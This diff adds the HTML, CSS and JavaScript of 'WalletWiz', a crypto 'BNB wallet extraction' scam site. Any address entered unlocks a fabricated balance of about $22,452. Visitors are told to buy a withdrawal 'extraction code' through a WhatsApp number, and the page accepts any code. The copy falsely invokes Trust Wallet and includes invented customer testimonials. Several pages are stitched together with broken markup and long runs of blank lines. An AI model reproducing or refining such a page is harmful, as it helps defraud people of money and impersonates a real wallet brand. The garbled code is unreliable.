@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WalletWiz & BNB Extraction Source</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #a8c0ff, #3f2b96);
+            color: #333;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        h1 {
+            text-align: center;
+            color: #3f2b96;
+            margin-bottom: 20px;
+        }
+
+        .balance {
+            display: flex;
+            justify-content: space-between;
+            padding: 15px 0;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .balance h3 {
+            margin: 0;
+            color: #4a4a4a;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center; 
+            margin-top: 30px;
+        }
+
+        button {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease, transform 0.2s ease; 
+            margin: 0 10px; 
+        }
+
+        .withdraw-button {
+            background-color: #ff6b6b; 
+            color: white;
+        }
+
+        .withdraw-button:hover {
+            background-color: #ff4d4d; 
+            transform: scale(1.05); 
+        }
+
+        /* Pop-Up Styles */
+        .popup {
+            display: flex; 
+            position: fixed; 
+            left: 0; 
+            top: 0; 
+            width: 100%; 
+            height: 100%; 
+            background-color: rgba(0,0,0,0.7); 
+            justify-content: center; 
+            align-items: center; 
+        }
+
+        .popup-content {
+            background-color: white; 
+            padding: 30px; 
+            border-radius: 10px; 
+            text-align: center; 
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        input[type="text"] {
+          padding:10px; 
+          width:80%; 
+          margin-top:10px; 
+          border-radius:5px; 
+          border:none; 
+          box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+          font-size:16px; 
+          outline:none; 
+      }
+      
+      input[type="text"]:focus {
+          border-bottom:2px solid #ff6b6b; 
+      }
+
+      /* WalletWiz Styles */
+      .navbar {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          padding: 10px 20px;
+          background-color: white;
+          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      }
+
+      .logo {
+          display: flex;
+          align-items: center;
+      }
+
+      .logo svg {
+          width: 50px;
+          height: 50px;
+      }
+
+      .menu {
+          display:flex;
+          flex-direction:center; /* Adjusted for better alignment */
+      }
+
+      .menu span {
+          height:4 px ;
+          width :30 px ;
+          background-color :#0d47a1 ;
+          margin :3 px ; /* Adjusted for better spacing */
+      }
+
+      .logo-text {
+          font-size :18 px ; /* Adjusted for better readability */
+          font-weight:bold ; /* Adjusted for better emphasis */
+          color :#0d47a1 ;
+          margin-left :10 px ; /* Adjusted for better spacing */
+      }
+
+      /* Dropdown Menu Styles */
+      .dropdown {
+          display:none; /* Hidden by default */
+          position:absolute; /* Positioning */
+           top :60 px ; /* Positioning */
+           right :20 px ; /* Positioning */
+           background-color:white ; /* Background Color */
+           box-shadow :0 px ,4 px ,8 px ,rgba (0 ,0 ,0 ,0.1) ; /* Shadow */
+           border-radius :5 px ; /* Border Radius */
+           overflow:hidden ; /* Overflow Hidden */
+           z-index :1000 ; /* Z-Index */
+       }
+       .dropdown a{
+           display:block ; /* Block Display */
+           padding :10 px ,20 px ; /* Padding */
+           color:#0d47a1 ; /* Color */
+           text-decoration:none ; /* Text Decoration */
+           font-weight:bold ; /* Font Weight */
+       }
+       .dropdown a:hover{
+           background-color:#f0f0f0 ; /* Background Color on Hover */
+       }
+       /* Section Styles */
+       .section{
+           display:none ; /* Hidden by default */
+           padding :20 px ; /* Padding */
+           background-color:#000000 ; /* Background Color */
+           border-radius :5 px ; /* Border Radius */
+           margin :20 px ; /* Margin */
+           box-shadow :0 px ,4 px ,8 px ,rgba (0 ,0 ,0 ,0.1) ; /* Shadow */
+       }
+       .section h2{
+           color:#0d47a1 ; /* Color of Heading */
+       }
+       .section p{
+           line-height :1.6 ; /* Line Height */
+       }
+       /* Back Button Styles */
+       .back-button{
+           display:inline-block ; /* Inline Block Display */
+           margin-top :20 px ; /* Margin Top */
+           padding :10 px ,20 px ; /* Padding */
+           background-color:#0d47a1 ; /* Background Color */
+           color:white ; /* Text Color */
+           text-decoration:none ; /* Text Decoration */
+           font-weight:bold ; /* Font Weight */
+           border-radius :5 px ; /* Border Radius */
+           cursor:pointer ; /* Cursor Pointer */
+           transition :background-color ,transition-duration :background-color (duration) { transition-duration :background-color } ;
+       }
+       
+       .back-button:hover{
+           background-color:#003c8f ;
+       }
+    </style>
+</head>
+<body>
+
+<!-- Pop-Up for BNB Address Input -->
+<div class="popup" id="address-popup">
+    <div class="popup-content">
+        <h3>Input the BNB Address to Extract Wallet</h3>
+        <input type="text" id="bnb-address" placeholder="Enter BNB Address" maxlength="42">
+        <button onclick="validateAddress()">Submit</button>
+        <p id="error-message" style="color:red;"></p>
+    </div>
+</div>
+
+<div class="container" id="main-dashboard" style="display:none;">
+    <h1>BNB Wallet Extraction Source</h1>
+    
+    <div class="balance">
+        <h3>BNB Balance:</h3>
+        <h3 id="bnb-balance"> 40.08494194 BNB</h3>
+    </div>
+    
+    <div class="balance">
+        <h3>Balance USD:</h3>
+        <h3 id="total-money">$22,452.86</h3>
+    </div>
+
+    <!-- Message about purchasing extraction code -->
+    <p style="text-align:center; margin-top:20px;">
+       <strong>Purchase your extraction code to withdraw funds.</strong>
+    </p>
+
+    <div class="button-container">
+        <button class="withdraw-button" onclick="showExtractionCodePopup()">Withdraw</button>
+    </div>
+</div>
+
+<!-- Pop-Up for Extraction Code Input -->
+<div class="popup" id="extraction-popup" style="display:none;">
+    <div class="popup-content">
+        <h3>TO GAIN ACCESS Input the Withdrawal Code You Purchased</h3>
+        <input type="text" id="extraction-code" placeholder="Enter Extraction Code">
+        <button onclick="validateExtractionCode()">Submit</button>
+        <p id="extraction-error-message" style="color:red;"></p>
+    </div>
+</div>
+
+<!-- WalletWiz Section -->
+<div class="navbar">
+    <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+             <defs>
+                 <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                     <stop offset="0%" style="stop-color:#00f;stop-opacity=1"/>
+                     <stop offset= "100%" style= "stop-color:#00f;stop-opacity=1"/>
+                 </linearGradient>
+             </defs>
+             <path d= "M32,2L4,12v19c01613-31-28-31s28-15-28-31V12L32-2z"/>
+         </svg>
+         <span class= ><h3>this is your balance imported from your trust wallet using the extracting ADDRESS :0x4a7C02A6800303eA888bfce....</h3></span>
+     </div>
+
+     <div class= "menu" onclick= "toggleMenu()">
+         
+     </div>
+
+     <!-- Dropdown Menu -->
+     <div class= "dropdown" id= "dropdownMenu">
+         <a href="#about-us" onclick= "showSection('about-us')">About Us</a>
+         <a href="#privacy-policy" onclick= "showSection('privacy-policy')">Privacy Policy</a>
+         <a href="#terms-conditions" onclick= "showSection('terms-conditions')">Terms and Conditions</a>
+     </div>
+ </div>
+
+ <!-- Sections for content -->
+<div id= "about-us" class= "section">
+     <h2>About Us</h2>
+     <p>Welcome to Walletwiz...</p> <!-- Content omitted for brevity -->
+     <a class= "back-button" onclick= "goBack()">Back to Main</a>
+ </div>
+
+<div id= "privacy-policy" class= "section">
+     <h2>Privacy Policy</h2>
+     <!-- Content omitted for brevity -->
+     <a class= "back-button" onclick= "goBack()">Back to Main</a>
+ </div>
+
+<div id= "terms-conditions" class= "section">
+     <h2>Terms and Conditions</h2>
+     <!-- Content omitted for brevity -->
+     <a class= "back-button" onclick= "goBack()">Back to Main</a>
+ </div>
+
+<script>
+// JavaScript Functions
+function validateAddress() {
+    const address = document.getElementById('bnb-address').value.trim();
+    
+    if (address.length >=10) {
+         alert("BNB Address accepted! Proceed with extraction...");
+         document.getElementById('address-popup').style.display = 'none';
+         document.getElementById('main-dashboard').style.display = 'block';
+         
+     } else {
+         document.getElementById('error-message').innerText = "Make sure this is a valid wallet for extraction.";
+     }
+}
+
+function showExtractionCodePopup() {
+    document.getElementById('extraction-popup').style.display = 'flex';
+}
+
+function validateExtractionCode() {
+    const code = document.getElementById('extraction-code').value.trim();
+    
+    if (code.length > 0) { // Example condition
+         alert("Valid extraction code! You may proceed with your withdrawal.");
+         document.getElementById('extraction-popup').style.display = 'none';
+         
+     } else {
+         document.getElementById('extraction-error-message').innerText = "Please enter a valid extraction code.";
+     }
+}
+
+// Toggle Dropdown Menu
+function toggleMenu() {
+   var dropdown = document.getElementById("dropdownMenu");
+   dropdown.style.display = dropdown.style.display === "block" ? "none" : "block";
+}
+
+// Show specific section and hide others
+function showSection(sectionId) {
+   var sections = document.querySelectorAll('.section');
+   sections.forEach(function(section) { section.style.display = 'none'; });
+   document.getElementById(sectionId).style.display = 'block'; 
+
+   var dropdown = document.getElementById("dropdownMenu");
+   dropdown.style.display = 'none';
+}
+
+// Go back to main menu (hide all sections)
+function goBack() {
+   var sections = document.querySelectorAll('.section');
+   sections.forEach(function(section) { section.style.display = 'none'; });
+}
+
+// Close dropdown when clicking outside
+window.onclick = function(event) {
+   if (!event.target.matches('.menu') && !event.target.closest('.menu')) {
+       var dropdown = document.getElementById("dropdownMenu");
+       if (dropdown.style.display === "block") { dropdown.style.display = "none"; }
+   }
+}
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WalletWiz bnb extraction source</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: white;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo svg {
+            width: 50px;
+            height: 50px;
+        }
+
+        .menu {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .menu span {
+            height: 4px;
+            width: 30px;
+            background-color: #0d47a1;
+            margin: 3px 0;
+            transition: 0.3s;
+        }
+
+        .logo-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #0d47a1;
+            margin-left: 10px;
+        }
+
+        .logo svg path {
+            fill: url(#grad1);
+        }
+
+        /* Dropdown Menu Styles */
+        .dropdown {
+            display: none;
+            position: absolute;
+            top: 60px;
+            right: 20px;
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            z-index: 1000;
+        }
+
+        .dropdown a {
+            display: block;
+            padding: 10px 20px;
+            color: #0d47a1;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .dropdown a:hover {
+            background-color: #f0f0f0;
+        }
+
+        /* Section Styles */
+        .section {
+            display: none;
+            padding: 20px;
+            background-color: #000000;
+            border-radius: 5px;
+            margin: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .section h2 {
+            color: #0d47a1;
+        }
+
+        .section p {
+            line-height: 1.6;
+        }
+
+        /* Back Button Styles */
+        .back-button {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #0d47a1;
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .back-button:hover {
+            background-color: #003c8f;
+        }
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </style>
+</head>
+<body>
+
+    <div class="navbar">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+                <defs>
+                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#00f;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#0f0;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <path d="M32 2L4 12v19c0 16 13 31 28 31s28-15 28-31V12L32 2z"/>
+            </svg>
+            <ckspan class="logo-text"></span>
+        </div>
+
+        <div class="menu" onclick="toggleMenu()">
+          
+        </div>
+
+        <!-- Dropdown Menu -->
+        <div class="dropdown" id="dropdownMenu">
+            <a href="#about-us" onclick="showSection('about-us')">About Us</a>
+            <a href="#privacy-policy" onclick="showSection('privacy-policy')">Privacy Policy</a>
+            <a href="#terms-conditions" onclick="showSection('terms-conditions')">Terms and Conditions</a>
+        </div>
+    </div>
+
+    <!-- Sections for content -->
+    <div id="about-us" class="section">
+        <h2>About Us</h2>
+        <p>Welcome to Walletwiz, where millions of people have found a path to financial stability and success through recovery of lost wallets. Our mission is to empower individuals by providing innovative solutions that help them recover lost wallets and secure their financial future.</p>
+        <p>At Walletwiz, we have developed a unique passkey system that ensures you can recover your lost wallets with ease. Our platform has been a game-changer for countless users, enabling them to regain control over their finances, recover lost wallets, and achieve their goals. Walletwiz can help you earn money and build a stable financial future. We’re here to support you every step of the way.</p>
+        <a class="back-button" onclick="goBa()">Back to Main</a>
+    </div>
+ <link rel="stylesheet" href="style.css">
+
+    <div id="privacy-policy" class="section">
+        <h2>Privacy Policy</h2>
+        <p>1. Usage Data: We collect information about your interactions with our website, including the pages you visit, the time spent on those pages, and other diagnostic data.</p>
+        <p>2. How We Use Your Information:</p>
+        <ul>
+            <li>Provide and maintain our services</li>
+            <li>Improve and personalize your experience</li>
+            <li>Process transactions and send related information</li>
+            <li>Communicate with you, including sending updates and promotional materials</li>
+            <li>Monitor and analyze usage and trends to improve our services</li>
+        </ul>
+        <p>3. Sharing Your Information: We do not share your personal information with third parties except in the following circumstances:</p>
+        <ul>
+            <li>With your consent</li>
+            <li>To comply with legal obligations</li>
+            <li>To protect and defend our rights and property</li>
+        </ul>
+        <p>4. Security of Your Information: We take reasonable measures to protect your personal information.</p>
+        <a class="back-button" onclick="goBack()">Back to Main</a>
+    </div>
+
+    <div id="terms-conditions" class="section">
+        <h2>Terms and Conditions</h2>
+        <p>1. Introduction: By accessing or using our website, you agree to comply with and be bound by these Terms and Conditions. If you do not agree with these terms, please do not use our website.</p>
+        <p>2. Use of the Website: Eligibility: You must be at least 18 years old to use our services. You are responsible for maintaining the confidentiality of your account information.</p>
+        <p>3. Services Provided: WalletWiz offers a passkey system to help users recover lost wallets. We strive to ensure the accuracy and reliability of our services.</p>
+        <p>4. User Responsibilities: Accurate Information: You agree to provide accurate and complete information when using our services.</p>
+        <a class="back-button" onclick="goBack()">Back to Main</a>
+    </div>
+
+    <script>
+        // Toggle Dropdown Menu
+        function toggleMenu() {
+            var dropdown = document.getElementById("dropdownMenu");
+            if (dropdown.style.display === "block") {
+                dropdown.style.display = "none";
+            } else {
+                dropdown.style.display = "block";
+            }
+        }
+
+        // Show specific section and hide others
+        function showSection(sectionId) {
+            var sections = document.querySelectorAll('.section');
+            sections.forEach(function(section) {
+                section.style.display = 'none';  // Hide all sections
+            });
+            document.getElementById(sectionId).style.display = 'block'; // Show selected section
+
+            // Hide dropdown after selection
+            var dropdown = document.getElementById("dropdownMenu");
+            dropdown.style.display = 'none';
+        }
+
+        // Go back to main menu (hide all sections)
+        function goBack() {
+            var sections = document.querySelectorAll('.section');
+            sections.forEach(function(section) {
+                section.style.display = 'none';  // Hide all sections
+            });
+        }
+
+        // Close dropdown when clicking outside
+        window.onclick = function(event) {
+            if (!event.target.matches('.menu') && !event.target.closest('.menu')) {
+                var dropdown = document.getElementById("dropdownMenu");
+                if (dropdown.style.display === "block") {
+                    dropdown.style.display = "none";
+                }
+           }
+        }
+    </script>
+</body>
+</html   
+   
+   
+   
+   
+   
+   
+   
+   
+    <head>
+    <!-- Add the JavaScript code here -->
+    <script>
+        window.onload = function() {
+            document.getElementById("popup").style.display = "block";
+            setTimeout(function() {
+                document.getElementById("popup").style.display = "none";
+            }, 3000); // hide the popup after 3 seconds
+        }
+    </script>
+</head>
+
+<body>
+    <!-- Add the HTML code for the pop-up here -->
+    <div id="popup" style="display: none;">
+        <p>Welcome to the world of crypto, where magic happens!</p>
+        <p>Gain financial access and unlock new possibilities!</p>
+    </div>
+
+    <!-- ... rest of your HTML code ... -->
+</body>
+<div id="popup" style="display: none;">
+    <p>Welcome to the world of crypto, where magic happens!</p>
+    <p>Gain financial access and unlock new possibilities!</p>
+</div>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Walletwiz</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <!-- Header Section -->
+    <header class="hero">
+        <div class="container">
+            <h1 id="header-title">regain lost wallet assets with Trust Wallet Passkeys</h1>
+            <p id="header-desc">Extract lost crypto assets, recover lost wallets, and gain total control.</p>
+            <!-- WhatsApp link added to the "Purchase Passkeys" button -->
+            <a href="https://wa.me/+234 912 580 0543" class="cta-btn">BUY EXTRACTION CODE NOW </a>
+              <h3>
+                
+                   
+                    
+                </select>
+            </div>
+        </div>
+    </header>
+
+    <!-- Features Section -->
+    <section id="features" class="features">
+        <div class="container">
+            <h2 id="features-title">Why Choose Our Trust Wallet Passkeys?</h2>
+            <div class="feature-grid">
+                <div class="feature">
+                    <h3 id="feature-1-title">Ultimate Security</h3>
+                    <p id="feature-1-desc">Non-custodial keys mean only <strong>you</strong> have access to your crypto.</p>
+                </div>
+                <div class="feature">
+                    <h3 id="feature-2-title">Private & Anonymous</h3>
+                    <p id="feature-2-desc">DON'T SHARE YOUR PASSKEY WITH ANYONE. No third-party reliance for asset management.</p>
+                </div>
+                <div class="feature">
+                    <h3 id="feature-3-title">Multi-Blockchain Support</h3>
+                    <p id="feature-3-desc">Effortlessly access assets across different blockchains.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Benefits Section -->
+    <section id="benefits" class="benefits">
+        <div class="container">
+            <h2 id="benefits-title">What You Get with Our Passkeys</h2>
+            <ul>
+                <li id="benefit-1">Easy Setup: Quick activation for immediate access.</li>
+                <li id="benefit-2">Lifetime Use: One-time purchase for continuous protection and retrieval.</li>
+                <li id="benefit-3">Reliable Support: 24/7 customer service for assistance.</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- Importance Section -->
+    <section id="why-matters" class="why-matters">
+        <div class="container">
+            <h2 id="importance-title">Why the trust wallet passkeys Matters </h2>
+            <p id="importance-desc">It is simply a key to financial freedom,gain Access to lost wallets and trade securely, and enjoy peace of mind with a tool trusted by millions.</p>
+        </div>
+    </section>
+    <link rel="stylesheet" href="style.css">
+
+
+        </div>
+    </section>
+    <link rel="stylesheet" href="style.css">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer Section -->
+    <footer id="purchase" class="footer">
+        <div class="container">
+            <h2 id="footer-title">Ready to extract Your Assets?</h2>
+        </div>
+    </footer>
+
+    <!-- External Stylesheet Link -->
+    <link rel="stylesheet" href="styles.css">
+
+    <!-- JavaScript Code -->
+    <script>
+        const languageSelect = document.getElementById('language-select');
+        const elementsToTranslate = document.querySelectorAll('[id]');
+
+        const translations = {
+            en: {
+                'header-title': 'Unlock Your Crypto Freedom with Trust Wallet Passkeys',
+                'header-desc': 'Secure your assets, recover lost wallets, and gain total control.',
+                'features-title': 'Why Choose Our Trust Wallet Passkeys?',
+                'feature-1-title': 'Ultimate Security',
+                'feature-1-desc': 'Non-custodial keys mean only <strong>you</strong> have access to your crypto.',
+                'feature-2-title': 'Private & Anonymous',
+                'feature-2-desc': 'DON\'T SHARE YOUR PASSKEY WITH ANYONE. No third-party reliance for asset management.',
+                'feature-3-title': 'Multi-Blockchain Support',
+                'feature-3-desc': 'Effortlessly access assets across different blockchains.',
+                'benefits-title': 'What You Get with Our Passkeys',
+                'benefit-1': 'Easy Setup: Quick activation for immediate access.',
+                'benefit-2': 'Lifetime Use: One-time purchase for continuous protection and retrieval.',
+                'benefit-3': 'Reliable Support: 24/7 customer service for assistance.',
+                'importance-title': 'Why It Matters',
+                'importance-desc': 'Protect yourself from crypto theft, gain freedom to trade securely, and enjoy peace of mind with a tool trusted by millions.',
+                'offer-title': 'Limited Time Offer',
+                'offer-desc': 'Exclusive Discount: Get <strong>10% off</strong> your first purchase today! Money-Back Guarantee: Risk-free and satisfaction guaranteed.',
+                'comments-title': 'What Our Customers Are Saying',
+                'comment-1-title': 'John D.',
+                'comment-1-desc': '"Trust Wallet Passkeys have completely transformed the way I manage my crypto assets. I no longer worry about losing access to my investments."',
+                'comment-2-title': 'Michael S.',
+                'comment-2-desc': '"This is hands down the best decision I\'ve made for securing my digital assets. The passkeys are easy to use and give me total peace of mind."',
+                'comment-3-title': 'Sarah L.',
+                'comment-3-desc': '"I used to fear losing my crypto wallet, but with Trust Wallet Passkeys, I now have full control over my assets. It\'s a life-changing tool for me."',
+                'comment-4-title': 'Emily R.',
+                'comment-4-desc': '"Trust Wallet Passkeys helped me regain control of my lost wallet. Now, I can trade confidently knowing my assets are secure and accessible only by me."',
+                'footer-title': 'Ready to Recover Your Assets?'
+            },
+            es: {
+                'header-title': 'Desbloquea tu libertad criptográfica con Trust Wallet Passkeys',
+                'header-desc': 'Protege tus activos, recupera billeteras perdidas y obtiene control total.',
+                'features-title': '¿Por qué elegir nuestros Trust Wallet Passkeys?',
